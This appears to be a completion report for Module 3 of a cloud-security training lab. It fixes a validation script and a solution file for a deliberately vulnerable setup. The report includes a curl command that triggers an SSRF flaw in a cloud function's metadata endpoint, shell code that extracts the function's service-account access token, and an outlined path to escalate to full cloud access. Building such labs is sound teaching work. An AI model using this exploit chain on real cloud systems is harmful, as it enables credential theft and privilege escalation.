# Module 3 Validation Complete

## Summary
Successfully fixed the final validation issue in Module 3. All 24 validation checks are now passing.

## Issue Fixed
The validation script was failing to parse the access token from the cloud function's response due to escaped JSON in the `function_account` field.

## Changes Made

### 1. Fixed Token Parsing in validate-m3.sh (lines 347-359)
Updated the parsing logic to properly handle escaped JSON:
```bash
# Extract the entire function_account value including escaped quotes
FUNCTION_ACCOUNT=$(echo "$SSRF_RESPONSE" | sed -n 's/.*"function_account": "\(.*\)".*/\1/p' | head -1)

# Unescape the JSON and extract the access_token
EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | sed 's/\\"/"/g' | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)

# Added jq fallback for more robust parsing
if [ -z "$EXTRACTED_TOKEN" ] && command -v jq &> /dev/null; then
    EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | jq -r '.function_account' 2>/dev/null | jq -r '.access_token' 2>/dev/null)
fi
```

### 2. Updated solution.md Module 3 Commands
Updated line 67 to use Gen2 Cloud Run URLs instead of legacy Gen1 format:
```bash
# Get the Gen2 function URL (Cloud Run service)
FUNCTION_URL=$(gcloud run services describe monitoring-function --region=$LOCATION --format='value(status.url)')
# Or use the hard-coded URL from invoke_monitoring_function.sh
curl -s -X POST $FUNCTION_URL -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'
```

## Validation Results
```
=====================================
Validation Summary
=====================================
Passed: 24
Failed: 0

✓ All validation checks passed!
The infrastructure is correctly set up for Module 3.
```

## Attack Path Validated
1. VM with limited OAuth scopes (devstorage.read_only)
2. VM reads cloud function source from storage bucket
3. Source reveals SSRF vulnerability in metadata endpoint
4. Exploit extracts function's service account token
5. Function token has cloud-platform scope (full GCP access)
6. Demonstrates privilege escalation from limited to full access